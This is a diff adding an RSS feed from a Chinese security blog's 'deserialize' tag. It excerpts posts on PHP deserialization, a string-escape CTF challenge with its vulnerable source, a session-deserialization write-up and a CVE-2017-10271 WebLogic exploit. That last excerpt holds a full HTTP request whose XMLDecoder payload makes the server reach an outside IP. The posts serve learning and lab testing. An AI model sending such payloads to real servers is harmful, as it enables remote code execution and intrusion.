@@ -1,0 +1,67 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>deserialize on </title>
+    <link>https://wyb0.com/tags/deserialize/</link>
+    <description>Recent content in deserialize on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 18 Jul 2021 17:21:33 +0800</lastBuildDate>
+    
+	<atom:link href="https://wyb0.com/tags/deserialize/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>PHP 反序列化与字符串逃逸</title>
+      <link>https://wyb0.com/posts/2021/php-deserialize-and-string-escaping/</link>
+      <pubDate>Sun, 18 Jul 2021 17:21:33 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2021/php-deserialize-and-string-escaping/</guid>
+      <description>0x00 漏洞成因 该漏洞主要是因为序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了 serialize 函数之后
+0x01 条件  相邻两个属性的值是我们可以控制的 前一个属性的 s 长度可以发生变化（变长变短都可以）  若变长则可以直接在该属性中注入对象来达到反序列化 若变短则可以吞掉后面相邻属性的值，在后面的属性中注入新的对象   0x02 题目 Bugku CTF 的题
+&amp;lt;?php // php版本:5.4.44 header(&amp;quot;Content-type: text/html; charset=utf-8&amp;quot;); // highlight_file(__FILE__); class evil{ public $hint; public function __construct($hint){ $this-&amp;gt;hint = $hint; } public function __destruct(){ if($this-&amp;gt;hint===&amp;quot;hint.php&amp;quot;) { @$this-&amp;gt;hint = base64_encode(file_get_contents($this-&amp;gt;hint)); } var_dump($this-&amp;gt;hint); } function __wakeup() { if ($this-&amp;gt;hint != &amp;quot;╭(●｀∀´●)╯&amp;quot;) { //There&#39;s a hint in ./hint.php $this-&amp;gt;hint = &amp;quot;╰(●’◡’●)╮&amp;quot;; } } } class User { public $username; public $password; public function __construct($username, $password){ $this-&amp;gt;username = $username; $this-&amp;gt;password = $password; } } function filter($data){ $data = str_replace(&#39;123&#39;, &#39;abcdef&#39;, $data); return $data; } $username = $_POST[&#39;username&#39;]; $password = $_POST[&#39;password&#39;]; $a = serialize(new User($username, $password)); if(preg_match(&#39;/flag/is&#39;, $a)) die(&amp;quot;NoNoNo!</description>
+    </item>
+    
+    <item>
+      <title>PHP 反序列化</title>
+      <link>https://wyb0.com/posts/2021/php-deserialize/</link>
+      <pubDate>Thu, 08 Jul 2021 17:08:50 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2021/php-deserialize/</guid>
+      <description>0x01 php 中的魔法函数 __construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。
+__destruct()：PHP 中类的析构函数，销毁对象时调用。PHP 5 后引入了析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。
+__toString() 当一个对象被当作一个字符串使用。
+__sleep() 在对象在被序列化之前被调用。
+__wakeup 将在序列化之后立即被调用。
+0x02 序列化和反序列化 serialize() 会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会在 __construct 后被调用，然后才执行序列化操作。
+unserialize() 会检查类中是否存在一个 __wakeup() 方法。如果存在，则会在 __destruct 前调用 __wakeup 方法，预先准备对象需要的资源。
+0x03 序列化字符串格式 在 PHP 序列化得到的字符串中，字段根据长度判断内容、以 ; 作为字段的分隔、以 } 作为结尾(字符串除外)
+O:3:&amp;quot;ctf&amp;quot;:2:{s:11:&amp;quot;username&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:6:&amp;quot;cmd&amp;quot;;s:2:&amp;quot;ls&amp;quot;;} O 代表对象，因为我们序列化的是一个对象，序列化数组则用 A 来表示 3 代表类名长度 ctf 是类名 2 代表两个属性 s 代表字符串 11 代表属性名长度 username 是属性名 s:5:&amp;quot;admin&amp;quot; 属性值时字符串 属性值长度 属性值  0x04 序列化中的访问控制修饰符 需要注意的是当访问控制符为 private 与 protect 时，序列化时比较特殊：
+protected 属性被序列化的时候属性值会变成：%00*%00 属性名</description>
+    </item>
+    
+    <item>
+      <title>关于 PHP SESSION 反序列化</title>
+      <link>https://wyb0.com/posts/2018/php-session-deserialize/</link>
+      <pubDate>Mon, 23 Jul 2018 00:09:17 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2018/php-session-deserialize/</guid>
+      <description>0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。
+其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题
+我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。
+reber@wyb:~$ html cat /proc/version Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 reber@wyb:~$ html php --version PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb 9 2017 20:54:58) Copyright (c) 1997-2014 The PHP Group Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies reber@ubuntu-linux:~$ apachectl -v Server version: Apache/2.</description>
+    </item>
+    
+    <item>
+      <title>WebLogic 反序列化漏洞(CVE-2017-10271)</title>
+      <link>https://wyb0.com/posts/2018/cve-2017-10271/</link>
+      <pubDate>Fri, 09 Mar 2018 09:20:03 +0800</pubDate>
+      
+      <guid>https://wyb0.com/posts/2018/cve-2017-10271/</guid>
+      <description>0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &amp;lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下
+漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
+0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt; &amp;lt;soapenv:Header&amp;gt; &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt; &amp;lt;java version=&amp;quot;1.8&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt; &amp;lt;object id=&amp;quot;url&amp;quot; class=&amp;quot;java.net.URL&amp;quot;&amp;gt; &amp;lt;string&amp;gt;http://114.115.123.123:80/aaaaaaa&amp;lt;/string&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;object idref=&amp;quot;url&amp;quot;&amp;gt; &amp;lt;void id=&amp;quot;stream&amp;quot; method = &amp;quot;openStream&amp;quot; /&amp;gt; &amp;lt;/object&amp;gt; &amp;lt;/java&amp;gt; &amp;lt;/work:WorkContext&amp;gt; &amp;lt;/soapenv:Header&amp;gt; &amp;lt;soapenv:Body/&amp;gt; &amp;lt;/soapenv:Envelope&amp;gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.</description>
+    </item>
+    
+  </channel>
+</rss>
